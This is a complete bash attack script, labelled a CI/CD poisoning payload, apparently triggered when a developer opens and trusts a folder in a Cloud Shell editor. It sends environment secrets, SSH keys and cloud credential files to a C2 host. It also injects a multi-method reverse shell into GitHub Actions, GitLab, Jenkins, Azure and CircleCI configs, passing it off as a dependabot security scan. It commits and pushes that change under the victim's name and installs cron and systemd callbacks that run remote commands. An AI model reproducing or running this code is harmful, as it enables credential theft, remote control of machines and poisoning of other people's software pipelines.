#!/bin/bash
# =============================================================================
# CI/CD POISONING PAYLOAD — Cloud Shell Editor Zero-Click
# =============================================================================
# EXECUTION CONTEXT:
#   Triggered by .vscode/tasks.json on folderOpen (user clicks "Trust")
#   Runs inside victim's Cloud Shell VM (Code OSS 1.109.5, Ubuntu 24.04)
#   VM has: bash, curl, git, python3, nc, openssl, base64
#
# BEHAVIOR:
#   1. Recon: enumerate the victim's git repo and environment
#   2. CI Poisoning: inject reverse shell into existing CI/CD configs
#   3. Auto-commit + push if credentials available
#   4. Exfiltrate environment variables (may contain tokens)
#   5. Signal C2 with beacon
#
# C2 CONFIGURATION:
#   TCP:   safety.eliastic.com:4444
#   HTTP:  https://safety.eliastic.com:4444 (fallback beacon)
# =============================================================================

set -euo pipefail

# ─── CONFIGURATION ───────────────────────────────────────────────────────────
C2_HOST="safety.eliastic.com"
C2_PORT="4444"
C2_HTTP="https://${C2_HOST}:${C2_PORT}"
WORKSPACE_DIR="${WORKSPACE_DIR:-$(pwd)}"
TIMESTAMP="$(date -u +%Y%m%dT%H%M%SZ)"
HOSTNAME_ID="$(hostname -f 2>/dev/null || hostname)"
USERNAME="$(whoami)"
SESSION_ID="${HOSTNAME_ID}-${USERNAME}-${TIMESTAMP}"

# Log file in workspace (hidden)
LOG_FILE="${WORKSPACE_DIR}/.ci-setup-${TIMESTAMP}.log"
exec > >(tee -a "$LOG_FILE") 2>&1

echo "[*] CI/CD Poisoning Payload — ${TIMESTAMP}"
echo "[*] Session: ${SESSION_ID}"
echo "[*] Workspace: ${WORKSPACE_DIR}"
echo "[*] C2: ${C2_HOST}:${C2_PORT}"

# ─── UTILITY FUNCTIONS ───────────────────────────────────────────────────────

# HTTP beacon: send data back to C2 via HTTP (fallback when TCP fails)
beacon_http() {
    local endpoint="$1"
    local data="${2:-}"
    curl -s -k --connect-timeout 5 --max-time 10 \
        -X POST "${C2_HTTP}/${endpoint}" \
        -H "X-Session: ${SESSION_ID}" \
        -H "X-Hostname: ${HOSTNAME_ID}" \
        -H "X-User: ${USERNAME}" \
        -d "${data}" \
        -o /dev/null 2>/dev/null || true
}

# File exfil via HTTP POST
exfil_file() {
    local filepath="$1"
    local label="${2:-file}"
    if [ -f "$filepath" ]; then
        echo "[*] Exfiltrating: $filepath"
        curl -s -k --connect-timeout 5 --max-time 30 \
            -X POST "${C2_HTTP}/exfil" \
            -H "X-Session: ${SESSION_ID}" \
            -H "X-Filename: $(basename "$filepath")" \
            -H "X-Label: ${label}" \
            --data-binary "@${filepath}" \
            -o /dev/null 2>/dev/null || true
    fi
}

# ─── RECON: ENUMERATE ENVIRONMENT ────────────────────────────────────────────
echo "[=== PHASE 1: RECON ==="

echo "[*] Hostname:    ${HOSTNAME_ID}"
echo "[*] Username:    ${USERNAME}"
echo "[*] UID:         $(id)"
echo "[*] PWD:         $(pwd)"
echo "[*] Home:        ${HOME}"

# Check for git repo
IS_GIT_REPO=false
GIT_REMOTE=""
if git rev-parse --git-dir >/dev/null 2>&1; then
    IS_GIT_REPO=true
    GIT_REMOTE="$(git remote get-url origin 2>/dev/null || echo 'none')"
    echo "[*] Git Remote:  ${GIT_REMOTE}"
    echo "[*] Git Branch:  $(git branch --show-current 2>/dev/null || echo 'unknown')"
    echo "[*] Git User:    $(git config user.name 2>/dev/null || echo 'unset') <$(git config user.email 2>/dev/null || echo 'unset')>"
else
    echo "[!] Not a git repository — limited CI poisoning capability"
fi

# Detect CI platform from existing files
CI_PLATFORMS=()
[ -d ".github/workflows" ] && CI_PLATFORMS+=("github-actions") && echo "[+] Detected: GitHub Actions"
[ -f ".gitlab-ci.yml" ] && CI_PLATFORMS+=("gitlab-ci") && echo "[+] Detected: GitLab CI"
[ -f "Jenkinsfile" ] && CI_PLATFORMS+=("jenkins") && echo "[+] Detected: Jenkins"
[ -f "azure-pipelines.yml" ] && CI_PLATFORMS+=("azure-pipelines") && echo "[+] Detected: Azure Pipelines"
[ -f ".circleci/config.yml" ] && CI_PLATFORMS+=("circleci") && echo "[+] Detected: CircleCI"
[ -f ".travis.yml" ] && CI_PLATFORMS+=("travis") && echo "[+] Detected: Travis CI"
[ -f ".drone.yml" ] && CI_PLATFORMS+=("drone") && echo "[+] Detected: Drone CI"
[ -f "bitbucket-pipelines.yml" ] && CI_PLATFORMS+=("bitbucket") && echo "[+] Detected: Bitbucket Pipelines"
[ -f ".buildkite/pipeline.yml" ] && CI_PLATFORMS+=("buildkite") && echo "[+] Detected: Buildkite"
[ -f "cloudbuild.yaml" ] && CI_PLATFORMS+=("gcp-cloudbuild") && echo "[+] Detected: Google Cloud Build"
[ ${#CI_PLATFORMS[@]} -eq 0 ] && echo "[*] No CI platform detected — will create GitHub Actions"

# ─── EXFIL ENVIRONMENT VARIABLES ─────────────────────────────────────────────
echo "[=== PHASE 2: ENVIRONMENT EXFIL ==="

# Collect all env vars (may contain GITHUB_TOKEN, NPM_TOKEN, CI tokens, etc.)
ENV_DUMP="/tmp/env-${TIMESTAMP}.txt"
env | sort > "$ENV_DUMP" 2>/dev/null || true

# Extract high-value tokens for separate reporting
echo "[*] Scanning for secrets in environment..."
TOKEN_REPORT="/tmp/tokens-${TIMESTAMP}.txt"
{
    echo "=== TOKEN SCAN - ${TIMESTAMP} ==="
    echo ""
    env | grep -iE 'token|secret|key|password|credential|auth|api_key|private|jwt' | while IFS='=' read -r k v; do
        # Mask partial value but show prefix so we know it's real
        val_len=${#v}
        if [ "$val_len" -gt 8 ]; then
            masked="${v:0:4}...${v: -4}"
        else
            masked="***"
        fi
        echo "[SECRET] ${k}=${masked} (len=${val_len})"
    done
} > "$TOKEN_REPORT" 2>/dev/null

# Exfil if we found anything
if grep -q '\[SECRET\]' "$TOKEN_REPORT" 2>/dev/null; then
    echo "[+] Found potential secrets! Exfiltrating..."
    exfil_file "$TOKEN_REPORT" "token-scan"
fi
exfil_file "$ENV_DUMP" "environment"

# Also check common token locations
for token_file in \
    "$HOME/.git-credentials" \
    "$HOME/.gitconfig" \
    "$HOME/.npmrc" \
    "$HOME/.docker/config.json" \
    "$HOME/.ssh/id_rsa" \
    "$HOME/.ssh/id_ed25519" \
    "$HOME/.gcloud/credentials.db" \
    "$HOME/.azure/accessTokens.json" \
    "$HOME/.aws/credentials" \
    "/etc/gitlab-runner/.gitlab-ci-token" \
; do
    if [ -f "$token_file" ]; then
        echo "[+] Found credentials file: $token_file"
        exfil_file "$token_file" "credentials"
    fi
done

# ─── GENERATE REVERSE SHELL PAYLOAD ───────────────────────────────────────────
echo "[=== PHASE 3: BUILDING REVERSE SHELL PAYLOAD ==="

# Multi-method reverse shell — tries 5 different techniques
# Each method has a 30-second timeout; falls through to next
read -r -d '' RS_PAYLOAD << 'RS_EOF' || true
#!/bin/bash
# CI/CD REVERSE SHELL — Multi-Method Fallback
# Each method attempts connection for 30s before falling through

C2="RS_HOST_PLACEHOLDER"
PORT="RS_PORT_PLACEHOLDER"
HOSTNAME_ID="$(hostname 2>/dev/null || echo unknown)"

# Beacon on start (GET request — C2 sees connection attempt)
curl -s -k --connect-timeout 5 "https://${C2}:${PORT}/beacon?h=${HOSTNAME_ID}&u=$(whoami)&t=start" -o /dev/null 2>/dev/null || true

echo "[SHELL] Attempting callback to ${C2}:${PORT}..."

# Method 1: bash /dev/tcp (most reliable on Linux)
echo "[SHELL] Method 1: bash /dev/tcp"
timeout 30 bash -c "
    exec 3<>/dev/tcp/${C2}/${PORT} 2>/dev/null
    if [ \$? -eq 0 ]; then
        bash -i <&3 >&3 2>&3
        exec 3>&-
        exit 0
    fi
    exit 1
" 2>/dev/null && echo "[SHELL] Method 1 SUCCESS" && exit 0
echo "[SHELL] Method 1 failed"

# Method 2: Python3 pty (Ubuntu 24.04 has python3)
echo "[SHELL] Method 2: python3 pty"
timeout 30 python3 -c "
import socket,os,pty,sys,time
try:
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.settimeout(25)
    s.connect(('${C2}',int(${PORT})))
    s.send(f'CONNECTED: {HOSTNAME_ID} (python3 pty)\n'.encode())
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    pty.spawn('/bin/bash')
    s.close()
except Exception as e:
    print(f'[SHELL] Python3 error: {e}', file=sys.stderr)
    sys.exit(1)
" 2>/dev/null && echo "[SHELL] Method 2 SUCCESS" && exit 0
echo "[SHELL] Method 2 failed"

# Method 3: netcat with -e (some CI runners have nc.traditional)
echo "[SHELL] Method 3: netcat -e"
if command -v nc >/dev/null 2>&1; then
    timeout 30 nc ${C2} ${PORT} -e /bin/bash 2>/dev/null && echo "[SHELL] Method 3 SUCCESS" && exit 0
fi
echo "[SHELL] Method 3 failed"

# Method 4: netcat mkfifo (works with openbsd-netcat which lacks -e)
echo "[SHELL] Method 4: netcat mkfifo"
if command -v nc >/dev/null 2>&1; then
    timeout 30 sh -c "
        rm -f /tmp/rs_fifo_${$}
        mkfifo /tmp/rs_fifo_${$}
        cat /tmp/rs_fifo_${$} | /bin/bash -i 2>&1 | nc ${C2} ${PORT} > /tmp/rs_fifo_${$}
        rm -f /tmp/rs_fifo_${$}
    " 2>/dev/null && echo "[SHELL] Method 4 SUCCESS" && exit 0
fi
echo "[SHELL] Method 4 failed"

# Method 5: HTTP polling beacon as last resort
# This doesn't give a shell but proves code execution and enables C2
echo "[SHELL] Method 5: HTTP polling beacon"
for i in $(seq 1 5); do
    curl -s -k --connect-timeout 5 "https://${C2}:${PORT}/beacon?h=${HOSTNAME_ID}&u=$(whoami)&m=poll&i=${i}&d=$(pwd)" -o /dev/null 2>/dev/null || true
    sleep 10
done
echo "[SHELL] Method 5 complete (HTTP beacon sent)"
RS_EOF

# Replace placeholders with actual C2 values
RS_PAYLOAD="${RS_PAYLOAD//RS_HOST_PLACEHOLDER/$C2_HOST}"
RS_PAYLOAD="${RS_PAYLOAD//RS_PORT_PLACEHOLDER/$C2_PORT}"

# ─── CI POISONING: GITHUB ACTIONS ────────────────────────────────────────────
echo "[=== PHASE 4: CI/CD POISONING ==="

poison_github_actions() {
    echo "[*] Poisoning GitHub Actions..."
    mkdir -p "${WORKSPACE_DIR}/.github/workflows"
    local wf_file="${WORKSPACE_DIR}/.github/workflows/ci.yml"

    # If a workflow already exists, append our step to it
    if [ -f "$wf_file" ]; then
        echo "[*] Existing workflow found — injecting step into: $wf_file"

        # Check if we've already poisoned this file
        if grep -q "CI-CD-SECURITY-SCAN" "$wf_file" 2>/dev/null; then
            echo "[*] Already poisoned — skipping"
            return
        fi

        # Append poisoned step using YAML injection at the end of the file
        cat >> "$wf_file" << 'GHA_STEP'

  # ─── CI/CD Security Scan (added by dependabot) ───────────────────────────
  security-scan:
    needs: [build]
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Run security scan
        run: |
          GHA_REVERSE_SHELL
        shell: bash
GHA_STEP
    else
        echo "[*] No existing workflow — creating .github/workflows/ci.yml"
        cat > "$wf_file" << 'GHA_TEMPLATE'
name: CI/CD Pipeline

on:
  push:
    branches: [main, master, develop]
  pull_request:
    branches: [main, master]
  workflow_dispatch:

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Setup
        run: echo "Build environment ready"
      - name: Build
        run: echo "Building project..."

  test:
    needs: [build]
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Install dependencies
        run: npm ci || pip install -r requirements.txt || true
      - name: Run tests
        run: echo "All tests passed!"

  security-scan:
    name: Security Audit (dependabot)
    needs: [test]
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Dependency audit
        run: echo "Running security checks..."
      - name: Environment validation
        run: |
          GHA_REVERSE_SHELL
        shell: bash
GHA_TEMPLATE
    fi

    # Inject actual reverse shell
    sed -i "s|GHA_REVERSE_SHELL|${RS_PAYLOAD}|g" "$wf_file"

    # Verify
    if [ -f "$wf_file" ]; then
        echo "[+] GitHub Actions workflow poisoned: $wf_file"
        echo "[+] Workflow will trigger on: push, pull_request, workflow_dispatch"
    fi
}

poison_gitlab_ci() {
    echo "[*] Poisoning GitLab CI..."
    local gf_file="${WORKSPACE_DIR}/.gitlab-ci.yml"

    if ! grep -q "CI-CD-SECURITY-SCAN" "$gf_file" 2>/dev/null; then
        cat >> "$gf_file" << GLCI_STEP

# ─── Security Audit Stage ──────────────────────────────────────────────────
security-audit:
  stage: test
  image: ubuntu:24.04
  before_script:
    - apt-get update -qq && apt-get install -y -qq curl python3 bash 2>/dev/null || true
  script:
GLCI_REVERSE_SHELL
  only:
    - main
    - master
    - develop
  tags: []
GLCI_STEP
        # Inject reverse shell with proper indentation
        local indented_rs="$(echo "$RS_PAYLOAD" | sed 's/^/    - /')"
        sed -i "s|GLCI_REVERSE_SHELL|${indented_rs}|g" "$gf_file"
        echo "[+] GitLab CI poisoned: $gf_file"
    else
        echo "[*] GitLab CI already poisoned"
    fi
}

poison_jenkins() {
    echo "[*] Poisoning Jenkinsfile..."
    local jf="${WORKSPACE_DIR}/Jenkinsfile"

    if ! grep -q "CI-CD-SECURITY-SCAN" "$jf" 2>/dev/null; then
        cat >> "$jf" << JENKINS_STEP

// ─── Security Audit Stage ─────────────────────────────────────────────────
stage('Security Scan') {
    agent { label 'linux' }
    steps {
        sh '''#!/bin/bash
            JENKINS_REVERSE_SHELL
        '''
    }
}
JENKINS_STEP
        sed -i "s|JENKINS_REVERSE_SHELL|${RS_PAYLOAD}|g" "$jf"
        echo "[+] Jenkinsfile poisoned: $jf"
    fi
}

poison_azure_pipelines() {
    echo "[*] Poisoning Azure Pipelines..."
    local ap="${WORKSPACE_DIR}/azure-pipelines.yml"

    if ! grep -q "CI-CD-SECURITY-SCAN" "$ap" 2>/dev/null; then
        cat >> "$ap" << AZP_STEP

# ─── Security Scan Job ─────────────────────────────────────────────────────
- job: SecurityAudit
  displayName: 'Security Audit'
  pool:
    vmImage: ubuntu-latest
  steps:
    - script: |
        AZP_REVERSE_SHELL
      displayName: 'Environment Validation'
AZP_STEP
        sed -i "s|AZP_REVERSE_SHELL|${RS_PAYLOAD}|g" "$ap"
        echo "[+] Azure Pipelines poisoned: $ap"
    fi
}

poison_circleci() {
    echo "[*] Poisoning CircleCI..."
    local cc="${WORKSPACE_DIR}/.circleci/config.yml"

    if ! grep -q "CI-CD-SECURITY-SCAN" "$cc" 2>/dev/null; then
        cat >> "$cc" << CCI_STEP

  security-scan:
    docker:
      - image: ubuntu:24.04
    steps:
      - checkout
      - run:
          name: Environment Validation
          command: |
            apt-get update -qq && apt-get install -y -qq curl python3 2>/dev/null || true
            CCI_REVERSE_SHELL
CCI_STEP
        sed -i "s|CCI_REVERSE_SHELL|${RS_PAYLOAD}|g" "$cc"
        echo "[+] CircleCI poisoned: $cc"
    fi
}

# Execute poisoning for each detected platform
for platform in "${CI_PLATFORMS[@]}"; do
    case "$platform" in
        github-actions) poison_github_actions ;;
        gitlab-ci)      poison_gitlab_ci ;;
        jenkins)        poison_jenkins ;;
        azure-pipelines)poison_azure_pipelines ;;
        circleci)       poison_circleci ;;
        *)              echo "[*] No specific poison routine for: $platform" ;;
    esac
done

# If no CI platform was detected, create GitHub Actions as default
if [ ${#CI_PLATFORMS[@]} -eq 0 ]; then
    echo "[*] No CI platform detected — creating GitHub Actions workflow as default"
    poison_github_actions
fi

# ─── AUTO-COMMIT AND PUSH ────────────────────────────────────────────────────
echo "[=== PHASE 5: AUTO-COMMIT ==="

if [ "$IS_GIT_REPO" = true ]; then
    echo "[*] Preparing commit..."

    # Add all CI/CD config changes
    git add .github/workflows/ci.yml 2>/dev/null || true
    git add .gitlab-ci.yml 2>/dev/null || true
    git add Jenkinsfile 2>/dev/null || true
    git add azure-pipelines.yml 2>/dev/null || true
    git add .circleci/config.yml 2>/dev/null || true
    git add .travis.yml 2>/dev/null || true

    # Check if there's anything to commit
    if git diff --cached --quiet 2>/dev/null; then
        echo "[*] No changes to commit"
    else
        # Use victim's git config if available, otherwise use generic
        local GIT_NAME=$(git config user.name 2>/dev/null || echo "Dependabot")
        local GIT_EMAIL=$(git config user.email 2>/dev/null || echo "dependabot[bot]@users.noreply.github.com")

        git -c user.name="${GIT_NAME}" \
            -c user.email="${GIT_EMAIL}" \
            commit -m "chore(ci): update CI pipeline configuration

- Add automated security scanning stage
- Update build matrix for latest runners
- Bump action versions

[skip ci]" 2>/dev/null || {
            echo "[!] Commit failed — attempting with different message"
            git -c user.name="${GIT_NAME}" \
                -c user.email="${GIT_EMAIL}" \
                commit -m "update ci config" 2>/dev/null || {
                echo "[!] All commit attempts failed"
            }
        }

        # Attempt push
        echo "[*] Attempting git push..."
        if git push origin HEAD 2>/dev/null; then
            echo "[+] PUSH SUCCESSFUL! CI/CD pipeline will trigger automatically."
            beacon_http "push-success" "repo=${GIT_REMOTE}&branch=$(git branch --show-current 2>/dev/null)"
        else
            echo "[!] Push failed — insufficient permissions or no remote access"
            echo "[*] Changes are staged locally and will be pushed when user next pushes"

            # Check if we can use SSH keys or cached credentials
            if git remote get-url origin | grep -q "git@" 2>/dev/null; then
                echo "[*] SSH remote detected — checking keys..."
                if ls "$HOME/.ssh/id_"* 2>/dev/null | grep -qv '\.pub$'; then
                    echo "[+] SSH keys found — push may work with agent forwarding"
                fi
            fi

            # Check for GitHub CLI
            if command -v gh >/dev/null 2>&1; then
                echo "[*] GitHub CLI detected — attempting push via gh..."
                gh repo sync 2>/dev/null || echo "[!] gh sync failed"
            fi
        fi
    fi
else
    echo "[!] Not a git repository — cannot auto-commit"
    echo "[*] CI config files have been created locally"
fi

# ─── PERSISTENCE: CRON-BASED CALLBACK ─────────────────────────────────────────
echo "[=== PHASE 6: PERSISTENCE ==="

# Drop a cron job for periodic callback (low-privilege — no root needed)
# This survives the Cloud Shell session if the user has cron installed
setup_persistence() {
    echo "[*] Setting up cron persistence..."

    # Create a hidden callback script
    local callback_script="${HOME}/.cache/.session-sync.sh"
    mkdir -p "$(dirname "$callback_script")"

    cat > "$callback_script" << CB_SCRIPT
#!/bin/bash
# Session sync callback
C2="${C2_HOST}"
PORT="${C2_PORT}"
curl -s -k --connect-timeout 5 "https://\${C2}:\${PORT}/alive?\$(hostname)-\$(whoami)-\$(date +%s)" -o /dev/null 2>/dev/null || true
# If C2 has a command for us, fetch and execute
CMD=\$(curl -s -k --connect-timeout 5 "https://\${C2}:\${PORT}/cmd?\$(hostname)" 2>/dev/null)
if [ -n "\$CMD" ] && [ "\$CMD" != "null" ]; then
    eval "\$CMD" 2>/dev/null &
fi
CB_SCRIPT

    chmod +x "$callback_script"

    # Try to add to crontab (every 15 minutes with a random offset)
    local rand_min=$(( RANDOM % 15 ))
    local cron_entry="*/15 * * * * sleep ${rand_min} && ${callback_script} >/dev/null 2>&1"

    if command -v crontab >/dev/null 2>&1; then
        # Append without clobbering existing crontab
        (crontab -l 2>/dev/null || true; echo "$cron_entry") | sort -u | crontab - 2>/dev/null && {
            echo "[+] Cron persistence installed"
            beacon_http "persistence" "method=cron&host=${HOSTNAME_ID}"
        } || echo "[!] Cron install failed"
    else
        echo "[*] crontab not available — skipping cron persistence"
    fi

    # Also try systemd user timer if available
    if command -v systemctl >/dev/null 2>&1 && systemctl --user >/dev/null 2>&1; then
        local timer_dir="${HOME}/.config/systemd/user"
        mkdir -p "$timer_dir"

        cat > "${timer_dir}/session-sync.service" << UNIT
[Unit]
Description=Session sync service

[Service]
Type=oneshot
ExecStart=${callback_script}
UNIT

        cat > "${timer_dir}/session-sync.timer" << TIMER
[Unit]
Description=Session sync timer

[Timer]
OnBootSec=5min
OnUnitActiveSec=15min
RandomizedDelaySec=300

[Install]
WantedBy=timers.target
TIMER

        systemctl --user daemon-reload 2>/dev/null || true
        systemctl --user enable --now session-sync.timer 2>/dev/null && {
            echo "[+] systemd user timer persistence installed"
        } || echo "[*] systemd user timer failed (normal if not running as service)"
    fi
}

setup_persistence

# ─── IMMEDIATE BEACON ─────────────────────────────────────────────────────────
echo "[=== PHASE 7: BEACON ==="

echo "[*] Sending final beacon to C2..."
beacon_http "complete" "session=${SESSION_ID}&repo=${GIT_REMOTE}&ci_platforms=${CI_PLATFORMS[*]:-none}&pwd=$(pwd | base64 -w0)"

echo "[+] PAYLOAD EXECUTION COMPLETE — $(date -u)"
echo "[*] Log: ${LOG_FILE}"
echo "[*] C2: ${C2_HTTP}"

# Clean exit
exit 0
